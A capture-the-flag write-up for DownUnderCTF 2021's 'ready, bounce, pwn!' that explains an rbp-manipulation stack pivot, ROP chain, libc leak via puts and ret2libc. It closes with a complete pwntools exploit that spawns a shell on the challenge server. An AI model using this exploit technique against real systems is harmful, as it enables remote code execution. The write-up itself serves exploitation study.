# ready, bounce, pwn!

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/1.png)

Check the file

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/2.png)

Let reverse it

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/3.png)

This is the main function, program call `read()` to get input to buffer, and than call `read_long`

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/4.png)

`Read_long` function call read to buf and them call atol

If you only look to the psuedo code, it just a normal program, no bug. But when I see in the assembly code, I found one thing.

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/5.png)

After call read_long, program call instruction add rbp, rax with rax is the return of atol.

Let look to the stack and see what we can do?

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/6.png)

The red border is the stack we can control de value on it, the first is fread() in read_long, the second is the fread() in main. Rbp pointer in main now is 0x7fffffffdeb0.

Author give me the libc, so it might be useful for ret2libc. The chall is look simply easy, because no PIE, we can use the puts_plt to leak the address of libc. We only control 3 continues block. But the pop_rdi, address, puts, return will need 4 block.

We can not use payload pop_rdi,address, return to return to the main and use the printf function to leak libc because we will lost the rbp control.

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/7.png)

For example, if you want to puts 3 block payload in 0x7fffffffde90, 0x7fffffffde98, 0x7fffffffdea0, you need to add the rbp to reach 0x7fffffffde88, and will pop rbp = 0x40123e

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/8.png)

Actually, this way can still be successful because the rbp pop value at 0x7fffffffde88 is the return address to main, is a fixed address, and we can still add rbp to return the correct payload next time. However, the server system running the challenge is ubuntu 64 bit, it requires before calling printf rsp % 0xff = 0 (align in 16 byte padding). So if we do like above, the rsp when we call printf is 0x7fffffffdea8 not align, so the program will catch segment fault.

So because of that, we will need a 4 block payload for the program to not have segment fault.

My solution is recall the function main in the payload to get 4 block payload control.

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/9.png)

Look at the stack, what happen ip we push the `main` address at 0x7fffffffde70 and add the rbp to reach 0x7fffffffde68? 

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/10.png)

When the program call leave, ret, the rbp will be set to = 0x00000a3131313131

And the the rsp now is 0x7fffffffde78 (not allign), but after we ret to the main function, we have two instruction `push rbp` and `mov rbp, rsp`

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/11.png)

So after the push instruction rsp now is 0x7fffffffde80  (allign) and the rbp will now equals 0x7fffffffde80 too. The different between call and ret, that is call will push the return address to the stack (so the stack will push 2 times), and ret is trush push 1 time. 

So now we are in main and look at the red and green block in image, you see what special? The red block is the second block of 3 previous `read_long()` block. And it is the block we can put in what ever we want on it (block 3 need to put main address, and block 1 need to push a string to add to rbp). 

So now we have 4 block payload (3 block in `main()` and 1 last block in previous `read_long()`), we can use the payload pop_rdi, address, puts, ret to leak the libc and return to main to reuse the vulnerabilities again. 

Note that the ret we use in 4 block payload is main address, but after the `push rbp` instruction, because we will need the instruction `mov rbp, rsp` (to restore rbp), but the `push rbp` will make the rsp not allign.

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/12.png)

Yah now we comback to function again, but now we already have libc leak, so we just have to put the payload pop_rdi, /bin/sh, system and add the rbp to get shell.

## Final exploit
  - First, input payload offset, main_after_push, main by read in `read_long()`, main address only need last 3 byte so we can easily put in

  - Second, now program return to main function, we puts 3 block of payload pop_rdi, got_address, puts to cocat with last block main_after_push to leak libc and return to main again.

  - Third, use libc leak to calculate the address of system, /bin/sh and get the shell

Note that the third payload only need 3 block and no get segment fault. Why? It really easy, just think about it :v. I already mentioned above :v

File [solve.py](/2021/DownUnderCTF2021/ready,bounce,pwn!/solve.py)

```python
from pwn import *
#s = process('./rbp')
s = remote('pwn-2021.duc.tf', 31910)
#raw_input('DEBUG')
pop_rdi = 0x00000000004012b3
ret = 0x000000000040101a
puts_got = 0x0000000000404018
puts_plt = 0x0000000000401030
puts_offset = 0x809d0
system_offset = 0x04fa60
bin_sh_offset = 0x1abf05
main = 0x00000000004011d5
main_not_push = 0x00000000004011d6
s.sendafter(b'name? ', b'Cobra')
s.sendafter(b'number? ', b'-72\x00\x00\x00\x00\x00' + p64(main_not_push) + p64(main)[:3])
payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
s.sendafter(b'name? ', payload)
s.sendafter(b'number? ', b'-40\x00\x00\x00\x00\x00')
puts_leak = int.from_bytes(s.recv(6).strip(), byteorder = 'little', signed = False)
libc_base = puts_leak - puts_offset
system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset
payload = p64(pop_rdi) + p64(bin_sh) + p64(system)
s.sendafter(b'name? ', payload)
s.sendafter(b'number? ', b'-40\x00\x00\x00\x00\x00')
s.interactive()
```

![](/2021/DownUnderCTF2021/ready,bounce,pwn!/images/13.png)

`flag: DUCTF{n0_0verfl0w?_n0_pr0bl3m!}`
